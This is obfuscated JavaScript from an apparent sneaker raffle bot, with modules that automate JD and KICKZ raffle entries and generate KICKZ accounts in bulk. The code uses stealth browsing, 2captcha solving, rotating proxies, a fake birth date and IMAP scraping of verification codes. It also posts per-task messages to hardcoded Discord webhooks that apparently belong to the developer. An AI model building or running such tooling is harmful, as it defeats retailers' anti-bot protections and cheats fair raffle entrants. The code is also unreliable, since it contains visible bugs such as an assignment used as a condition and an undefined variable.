                        console['log']('Waiting\x20for\x20' + _0x1940dd['delay'] + '\x20ms'), await _0xf09eb2(_0x1940dd['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0xb7610d, _0x5c441b, _0x4b2064) {
                var _0x599e18 = ![], _0x4845d6 = ![];
                if (_0x1940dd['captchaKey'] == '' || _0x1940dd['captchaKey'] == undefined)
                    return console['log'](_0x4f1d86['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x43efe1['use'](_0x2180a5()), _0x43efe1['use'](_0x46c0dc({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x1940dd['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x5b500b = 0x0; _0x5b500b < _0x5c441b['length']; _0x5b500b++) {
                    if (_0x5015d5 != 'yes')
                        var _0x5015d5 = '', _0x200097 = 0x0;
                    var _0x2ec83d, _0x54ec6d = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x5c441b[_0x5b500b]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x5c441b[_0x5b500b]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x1c4b49
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x1940dd['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x233a0d
                            }
                        ]
                    }];
                    const _0x11e626 = { 'embeds': _0x54ec6d };
                    _0x3e9ae7(_0xb7610d['name'] + '\x20Task\x20' + (_0x5b500b + 0x1) + '\x20/\x20' + _0x5c441b['length'] + '\x20||\x20File:\x20' + _0x5237bc + '\x20Proxies:\x20' + _0x3c7bd9);
                    try {
                        await _0xf6702b(_0x5c441b, _0x5b500b);
                    } catch {
                        _0x5015d5 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x34a981 = await _0x22cd2f(_0x5c441b[_0x5b500b], _0xb7610d, 'dev', ![]), _0x2d82a4 = await _0x22cd2f(_0x5c441b[_0x5b500b], _0xb7610d, 'pub', ![]);
                    const _0x9bae2c = {
                        'succesDEVMSG': { 'embeds': [_0x34a981] },
                        'succesPUBMSG': { 'embeds': [_0x2d82a4] }
                    };
                    if (_0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '')
                        try {
                            await _0x58a176(_0x1940dd['webhook'], _0x9bae2c['succesDEVMSG']);
                        } catch {
                        }
                    await _0xf09eb2(0xc8), await _0x58a176(_0x2faedb, _0x9bae2c['succesDEVMSG']), await _0xf09eb2(0xc8);
                    try {
                        await _0x58a176(_0x443f6, _0x9bae2c['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x5c441b[_0x5b500b]['Email'] == '' || _0x5c441b[_0x5b500b]['Url'] == '' || _0x5c441b[_0x5b500b]['FirstName'] == '' || _0x5c441b[_0x5b500b]['LastName'] == '') {
                        console['log'](_0x1fc391() + '\x20[' + _0xa96df6[taskModule]['name'] + ']\x20Task\x20' + (_0x5b500b + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x1940dd['useRandomProxy'] = ![])
                        var _0x4f1c71 = _0x4b2064[_0x5b500b]['split'](':');
                    else
                        var _0x426167 = Math['round'](Math['random']() * (_0x4b2064['length'] - 0x1)), _0x4f1c71 = _0x4b2064[_0x426167]['split'](':');
                    var _0x5f8ca4;
                    try {
                        _0x5f8ca4 = await _0x43efe1['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4f1c71[0x0] + ':' + _0x4f1c71[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x5f8ca4 = await _0x43efe1['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4f1c71[0x0] + ':' + _0x4f1c71[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x1fe9a6 = await _0x5f8ca4['newPage']();
                        await _0x1fe9a6['authenticate']({
                            'username': '' + _0x4f1c71[0x2],
                            'password': '' + _0x4f1c71[0x3]
                        }), console['log'](_0x1fc391() + '\x20[' + _0xb7610d['name'] + ']\x20Task\x20' + (_0x5b500b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1fe9a6['setRequestInterception'](!![]), _0x1fe9a6['on']('request', _0x24a14e => {
                            _0x24a14e['resourceType']() === 'image' || _0x24a14e['resourceType']() === 'font' || _0x24a14e['resourceType']() === 'media' ? _0x24a14e['abort']() : _0x24a14e['continue']();
                        });
                        try {
                            await _0x1fe9a6['goto']('' + _0x5c441b[_0x5b500b]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x1fe9a6['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x1fc391() + '\x20[' + _0xb7610d['name'] + ']\x20Task\x20' + (_0x5b500b + 0x1) + '\x20:\x20Filling\x20Information'), await _0x1fe9a6['type']('#comp_firstname', '' + _0x5c441b[_0x5b500b]['FirstName']), await _0x1fe9a6['waitForSelector']('#comp_lastname'), await _0x1fe9a6['type']('#comp_lastname', '' + _0x5c441b[_0x5b500b]['LastName']), await _0x1fe9a6['waitForSelector']('#comp_email'), await _0x1fe9a6['type']('#comp_email', '' + _0x5c441b[_0x5b500b]['Email']), await _0x1fe9a6['waitForSelector']('#comp_paypalemail'), await _0x1fe9a6['type']('#comp_paypalemail', '' + _0x5c441b[_0x5b500b]['Email']), await _0x1fe9a6['waitForSelector']('#comp_mobile_end'), await _0x1fe9a6['type']('#comp_mobile_end', '' + _0x5c441b[_0x5b500b]['Phone']), await _0x1fe9a6['waitForSelector']('#comp_dob'), await _0x1fe9a6['type']('#comp_dob', '08/09/1992'), console['log'](_0x1fc391() + '\x20[' + _0xb7610d['name'] + ']\x20Task\x20' + (_0x5b500b + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x5c441b[_0x5b500b]['Size'] == 'RANDOM') {
                            const _0x6f0d38 = await _0x1fe9a6['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x493c2a => {
                                return _0x493c2a['map'](_0xd26254 => _0xd26254['value']);
                            });
                            var _0xb0f364 = Math['round'](Math['random']() * (_0x6f0d38['length'] - 0x2));
                            await _0x1fe9a6['select']('#shoesize', _0x6f0d38[_0xb0f364 + 0x1]), await _0xf09eb2(0x3e8);
                        } else {
                            const _0x28e274 = await _0x1fe9a6['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x2dddc5 => {
                                return _0x2dddc5['map'](_0x5493cf => _0x5493cf['innerText']);
                            }), _0x47326e = await _0x1fe9a6['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x1b4255 => {
                                return _0x1b4255['map'](_0x4f4aff => _0x4f4aff['value']);
                            });
                            var _0x262d53 = _0x5c441b[_0x5b500b]['Size'];
                            for (var _0x14ace5 = 0x1; _0x14ace5 < _0x47326e['length']; _0x14ace5++) {
                                var _0x18ee74 = _0x28e274[_0x14ace5]['split']('\x20')[0x0];
                                if (_0x18ee74 == _0x262d53) {
                                    await _0x1fe9a6['select']('#shoesize', _0x47326e[_0x14ace5]);
                                    break;
                                } else {
                                    if (_0x14ace5 + 0x1 == _0x47326e['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x1fe9a6['waitForSelector']('#comp_address1'), await _0x1fe9a6['type']('#comp_address1', _0x5c441b[_0x5b500b]['Address1'] + '\x20' + _0x5c441b[_0x5b500b]['HouseNumber']), await _0x1fe9a6['waitForSelector']('#comp_address2'), await _0x1fe9a6['type']('#comp_address2', '' + _0x5c441b[_0x5b500b]['Address2']), await _0x1fe9a6['waitForSelector']('#comp_address2'), await _0x1fe9a6['type']('#comp_address3', '' + _0x5c441b[_0x5b500b]['City']), await _0x1fe9a6['waitForSelector']('#comp_postcode'), await _0x1fe9a6['type']('#comp_postcode', '' + _0x5c441b[_0x5b500b]['Zip']), console['log'](_0x1fc391() + '\x20[' + _0xb7610d['name'] + ']\x20Task\x20' + (_0x5b500b + 0x1) + '\x20:\x20Sending\x20Entry'), await _0xf09eb2(0x4b0), await _0x1fe9a6['click']('label#emailhold'), await _0xf09eb2(0x5dc), await _0x1fe9a6['click']('#preauth_tandc_email\x20>\x20label'), await _0xf09eb2(0x5dc), await _0x1fe9a6['click']('#submit');
                        try {
                            await _0x1fe9a6['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x1fc391() + '\x20[' + _0xb7610d['name'] + ']\x20Task\x20' + (_0x5b500b + 0x1) + '\x20:\x20' + _0x4f1d86['blue']('Awaiting\x20Paypal\x20Payment')), _0x5f8ca4['on']('targetcreated', async _0x55ee2b => {
                            if (_0x55ee2b['type']() === 'page') {
                                const _0x58259a = await _0x55ee2b['page']();
                                async function _0x200273() {
                                    try {
                                        await _0x1fe9a6['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x4845d6 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x135778() {
                                    try {
                                        await _0x1fe9a6['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x599e18 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x135778(), _0x200273(), await _0xf09eb2(0x493e0);
                            }
                        });
                        async function _0x466809() {
                            for (let _0x38d6ce = 0x0; _0x38d6ce < 0x12c; _0x38d6ce++) {
                                if (_0x599e18 == !![]) {
                                    _0x5015d5 = 'no', _0x3ed4cd(_0x5c441b[_0x5b500b], _0xb7610d), console['log'](_0x4f1d86['green'](_0x1fc391() + '\x20[' + _0xb7610d['name'] + ']\x20Task\x20' + (_0x5b500b + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '')
                                        try {
                                            await _0x58a176(_0x1940dd['webhook'], _0x9bae2c['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0xf09eb2(0xc8), await _0x58a176(_0x2faedb, _0x9bae2c['succesDEVMSG']), await _0xf09eb2(0xc8);
                                    try {
                                        await _0x58a176(_0x443f6, _0x9bae2c['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x4845d6)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0xf09eb2(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0xf09eb2(0xbb8), await _0x1fe9a6['click']('.zoid-outlet'), await _0xf09eb2(0x7d0), await _0x466809();
                    } catch (_0xac49bd) {
                        console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0xb7610d['name'] + ']\x20Task\x20' + (_0x5b500b + 0x1) + '\x20:\x20' + _0xac49bd)), _0x2ec83d = '' + _0xac49bd;
                        var _0x9bf364 = await _0x22cd2f(_0x5c441b[_0x5b500b], _0xb7610d, 'dev', !![], _0x2ec83d);
                        _0x9bae2c['errorDEV'] = { 'embeds': [_0x9bf364] }, _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x9bae2c['errorDEV']), await _0x58a176(_0x45f55a, _0x9bae2c['errorDEV']);
                    } finally {
                        _0x5f8ca4 && _0x5f8ca4['close']();
                        if (_0x5015d5 == 'yes' && _0x200097 != 0x5 && _0x2ec83d != 'Size\x20Not\x20Found') {
                            console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0xb7610d['name'] + ']\x20Task\x20' + (_0x5b500b + 0x1) + '\x20:\x20Retrying\x20(' + _0x200097 + '\x20/\x205)')), _0x5b500b = _0x5b500b - 0x1, _0x200097 = _0x200097 + 0x1;
                            continue;
                        }
                        _0x5015d5 == 'yes' && _0x200097 >= 0x5 && (_0x3f94a0(afew[_0x5b500b], _0xb7610d), _0x5015d5 = 'no', _0x200097 = 0x0), console['log']('Waiting\x20for\x20' + _0x1940dd['delay'] + '\x20ms'), await _0xf09eb2(_0x1940dd['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x25c2ed, _0x4efa5e, _0x58bfb9) {
                    _0x43efe1['use'](_0x2180a5()), _0x43efe1['use'](_0x46c0dc({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1940dd['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2d70c5 = 0x0; _0x2d70c5 < _0x4efa5e['length']; _0x2d70c5++) {
                        const _0x80f8df = 'https://www.kickz.com/login';
                        if (_0x33f5fc != 'yes')
                            var _0x33f5fc = '', _0x285d39 = 0x0;
                        _0x3e9ae7(_0x25c2ed['name'] + '\x20Task\x20' + (_0x2d70c5 + 0x1) + '\x20/\x20' + _0x4efa5e['length'] + '\x20||\x20File:\x20' + _0x5237bc + '\x20Proxies:\x20' + _0x3c7bd9);
                        try {
                            await _0xf6702b(_0x4efa5e, _0x2d70c5);
                        } catch {
                            _0x33f5fc = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0xaec671 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1c4b49
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x1940dd['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x233a0d
                                }
                            ]
                        }];
                        const _0x3f8c92 = { 'embeds': _0xaec671 };
                        var _0x416645 = await _0x22cd2f(_0x4efa5e[_0x2d70c5], _0x25c2ed, 'acc', ![]);
                        const _0x5c7a27 = { 'succesDEVMSG': { 'embeds': [_0x416645] } };
                        if (_0x4efa5e[_0x2d70c5]['Email'] == '' || _0x4efa5e[_0x2d70c5]['FirstName'] == '' || _0x4efa5e[_0x2d70c5]['LastName'] == '') {
                            console['log'](_0x1fc391() + '\x20[' + _0x25c2ed['name'] + ']\x20Task\x20' + (_0x2d70c5 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x4efa5e[_0x2d70c5]['Password'] == '' && (_0x4efa5e[_0x2d70c5]['Password'] = 'JRaffles23!');
                        if (_0x1940dd['useRandomProxy'] = ![])
                            var _0x5ab336 = _0x58bfb9[_0x2d70c5]['split'](':');
                        else
                            var _0x26f2df = Math['round'](Math['random']() * (_0x58bfb9['length'] - 0x1)), _0x5ab336 = _0x58bfb9[_0x26f2df]['split'](':');
                        var _0x5cb64f;
                        try {
                            _0x5cb64f = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5ab336[0x0] + ':' + _0x5ab336[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5cb64f = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5ab336[0x0] + ':' + _0x5ab336[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1580fc = await _0x5cb64f['newPage']();
                            await _0x1580fc['authenticate']({
                                'username': '' + _0x5ab336[0x2],
                                'password': '' + _0x5ab336[0x3]
                            }), console['log'](_0x1fc391() + '\x20[' + _0x25c2ed['name'] + ']\x20Task\x20' + (_0x2d70c5 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1580fc['setRequestInterception'](!![]), _0x1580fc['on']('request', _0x22944f => {
                                _0x22944f['resourceType']() === 'image' || _0x22944f['resourceType']() === 'font' || _0x22944f['resourceType']() === 'media' ? _0x22944f['abort']() : _0x22944f['continue']();
                            }), await _0x1580fc['goto'](_0x80f8df), await _0xf09eb2(0xbb8), console['log'](_0x1fc391() + '\x20[' + _0x25c2ed['name'] + ']\x20Task\x20' + (_0x2d70c5 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x1580fc['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1580fc['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1580fc['waitForSelector']('#button-register'), await _0xf09eb2(0x7d0), await _0x1580fc['evaluate'](() => {
                                const _0x235548 = document['querySelector']('#button-register');
                                _0x235548['click']();
                            }), console['log'](_0x1fc391() + '\x20[' + _0x25c2ed['name'] + ']\x20Task\x20' + (_0x2d70c5 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0xf09eb2(0x1388), await _0x1580fc['waitForSelector']('#customer_salutation'), await _0x1580fc['select']('#customer_salutation', 'mr'), await _0xf09eb2(0x7d0), await _0x1580fc['waitForSelector']('#customer_firstname'), await _0x1580fc['type']('#customer_firstname', '' + _0x4efa5e[_0x2d70c5]['FirstName']), await _0xf09eb2(0x352), await _0x1580fc['waitForSelector']('#customer_lastname'), await _0x1580fc['type']('#customer_lastname', '' + _0x4efa5e[_0x2d70c5]['LastName']), await _0xf09eb2(0x352), await _0x1580fc['type']('#email-input', '' + _0x4efa5e[_0x2d70c5]['Email']), await _0xf09eb2(0x352), await _0x1580fc['type']('#email-confirm-input', '' + _0x4efa5e[_0x2d70c5]['Email']), await _0xf09eb2(0x352), await _0x1580fc['type']('#register-password', '' + _0x4efa5e[_0x2d70c5]['Password']), await _0xf09eb2(0x352), await _0x1580fc['type']('#password-confirm', '' + _0x4efa5e[_0x2d70c5]['Password']), await _0xf09eb2(0x352), console['log'](_0x1fc391() + '\x20[' + _0x25c2ed['name'] + ']\x20Task\x20' + (_0x2d70c5 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x1580fc['click']('#consent'), await _0xf09eb2(0x1f4);
                            const _0x29fcf1 = await _0x1580fc['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x29fcf1) {
                                console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x25c2ed['name'] + ']\x20Task\x20' + (_0x2d70c5 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x1580fc['click']('#buttonRegister');
                            try {
                                await _0x1580fc['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x1fc391() + '\x20[' + _0x25c2ed['name'] + ']\x20Task\x20' + (_0x2d70c5 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x4efa5e[_0x2d70c5]['Email']), await _0xf09eb2(0x4b0);
                            async function _0x4484ad() {
                                var _0x45dcac, _0x75ca9d = ![];
                                for (var _0x123d7b = 0x0; _0x123d7b < 0x18; _0x123d7b++) {
                                    async function _0x2c99b7() {
                                        var _0x45c8e6 = new _0x533159({
                                            'user': _0x1940dd['masterMail'],
                                            'password': _0x1940dd['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x41a56b(_0x297a28) {
                                            _0x45c8e6['openBox']('INBOX', ![], _0x297a28);
                                        }
                                        _0x45c8e6['once']('ready', function () {
                                            console['log'](_0x1fc391() + '\x20[' + _0x25c2ed['name'] + ']\x20Task\x20' + (_0x2d70c5 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x41a56b(function (_0x5294ea, _0x209ebe) {
                                                console['log'](_0x1fc391() + '\x20[' + _0x25c2ed['name'] + ']\x20Task\x20' + (_0x2d70c5 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x5294ea)
                                                    throw _0x5294ea;
                                                _0x45c8e6['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x2bb175, _0x4bb3f2) {
                                                    if (!_0x4bb3f2 || !_0x4bb3f2['length'])
                                                        console['log'](_0x1fc391() + '\x20[' + _0x25c2ed['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x45c8e6['end']();
                                                    else {
                                                        var _0x1e55b5 = _0x45c8e6['seq']['fetch'](_0x4bb3f2, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x1e55b5['on']('message', function (_0x1c215c, _0x28fdf0) {
                                                            var _0x44cfd9 = '(#' + _0x28fdf0 + ')\x20';
                                                            _0x1c215c['on']('body', function (_0x1afb1e, _0x4a8573) {
                                                                _0x6212d5(_0x1afb1e, (_0x3240f8, _0x31f64a) => {
                                                                    if (_0x31f64a['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x17a216 = _0x31f64a['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x3c53d7 = _0x17a216[0x1]['split']('<')[0x0];
                                                                        _0x45dcac = _0x3c53d7;
                                                                    }
                                                                });
                                                            }), _0x1c215c['once']('end', function () {
                                                            });
                                                        }), _0x1e55b5['once']('error', function (_0x242bf3) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x1e55b5['once']('end', function () {
                                                            _0x45c8e6['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x45c8e6['once']('error', function (_0x3e8267) {
                                            console['log'](_0x4f1d86['red'](_0x3e8267['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x75ca9d = !![];
                                        }), _0x45c8e6['once']('end', async function () {
                                        }), _0x45c8e6['connect']();
                                    }
                                    _0x2c99b7(), await _0xf09eb2(0x1388);
                                    if (_0x45dcac)
                                        return _0x45dcac;
                                    if (_0x75ca9d)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x123d7b == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x4484ad(), _0xf09eb2(0x320), console['log'](_0x1fc391() + '\x20[' + _0x25c2ed['name'] + ']\x20Task\x20' + (_0x2d70c5 + 0x1) + '\x20:\x20Verifying..'), await _0x1580fc['type']('#verificationCode', code), await _0xf09eb2(0x1f4), await _0x1580fc['click']('#buttonVerify'), await _0xf09eb2(0x190), await _0x1580fc['click']('#buttonVerify'), await _0xf09eb2(0x3e8);
                            try {
                                await _0x1580fc['waitForSelector']('div.b-user_greeting'), _0x33f5fc = 'no', console['log'](_0x4f1d86['green'](_0x1fc391() + '\x20[' + _0x25c2ed['name'] + ']\x20Task\x20' + (_0x2d70c5 + 0x1) + '\x20:\x20Account\x20' + _0x4efa5e[_0x2d70c5]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x4b4581['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x4efa5e[_0x2d70c5]['Email'] + ',' + _0x4efa5e[_0x2d70c5]['Password'] + ','), console['log'](_0x1fc391() + '\x20[' + _0x25c2ed['name'] + ']\x20Task\x20' + (_0x2d70c5 + 0x1) + '\x20:\x20Account\x20' + _0x4efa5e[_0x2d70c5]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x5c7a27['succesDEVMSG']);
                                } catch {
                                }
                                await _0x58a176(_0x4ebcdb, _0x5c7a27['succesDEVMSG']);
                            } catch {
                                _0x33f5fc = 'no', console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x25c2ed['name'] + ']\x20Task\x20' + (_0x2d70c5 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x25c2ed['name'] + ']\x20Task\x20' + (_0x2d70c5 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x57dde6) {
                            console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x25c2ed['name'] + ']\x20Task\x20' + (_0x2d70c5 + 0x1) + '\x20:\x20' + _0x57dde6)), _0xaec671[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0xaec671[0x0]['description'] = '' + _0x57dde6, await _0x58a176(_0x45f55a, _0x3f8c92), _0x33f5fc = 'yes';
                        } finally {
                            _0x5cb64f && _0x5cb64f['close']();
                            if (_0x33f5fc == 'yes' && _0x285d39 != 0x5) {
                                console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x25c2ed['name'] + ']\x20Task\x20' + (_0x2d70c5 + 0x1) + '\x20:\x20Retrying\x20(' + _0x285d39 + '\x20/\x205)')), _0x2d70c5 = _0x2d70c5 - 0x1, _0x285d39 = _0x285d39 + 0x1;
                                continue;
                            }
                            _0x33f5fc == 'yes' && _0x285d39 >= 0x5 && (_0x3f94a0(_0x4efa5e[_0x2d70c5], _0x25c2ed), _0x33f5fc = 'no', _0x285d39 = 0x0), console['log']('Waiting\x20for\x20' + _0x1940dd['delay'] + '\x20ms'), await _0xf09eb2(_0x1940dd['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x53d311, _0x592b8a, _0xe8e1dc) {
                    _0x43efe1['use'](_0x2180a5()), _0x43efe1['use'](_0x46c0dc({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1940dd['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x309370 = 0x0; _0x309370 < _0x592b8a['length']; _0x309370++) {
                        var _0x1efe05;
                        if (_0x4719eb != 'yes')
                            var _0x4719eb = '', _0x1fcdf9 = 0x0;
                        _0x3e9ae7(_0x53d311['name'] + '\x20Task\x20' + (_0x309370 + 0x1) + '\x20/\x20' + _0x592b8a['length'] + '\x20||\x20File:\x20' + _0x5237bc + '\x20Proxies:\x20' + _0x3c7bd9);
                        var _0x46a767 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1c4b49
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x592b8a[_0x309370]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x592b8a[_0x309370]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x1940dd['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x233a0d
                                }
                            ]
                        }], _0xef400e = await _0x22cd2f(_0x592b8a[_0x309370], _0x53d311, 'dev', ![]), _0x107109 = await _0x22cd2f(_0x592b8a[_0x309370], _0x53d311, 'pub', ![]);
                        const _0x20430b = {
                            'succesDEVMSG': { 'embeds': [_0xef400e] },
                            'succesPUBMSG': { 'embeds': [_0x107109] }
                        };
                        try {
                            await _0xf6702b(_0x592b8a, _0x309370);
                        } catch {
                            _0x4719eb = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x592b8a[_0x309370]['Email'] == '' || _0x592b8a[_0x309370]['Password'] == '' || _0x592b8a[_0x309370]['FirstName'] == '' || _0x592b8a[_0x309370]['LastName'] == '') {
                            console['log'](_0x1fc391() + '\x20[' + _0x53d311['name'] + ']\x20Task\x20' + (_0x309370 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
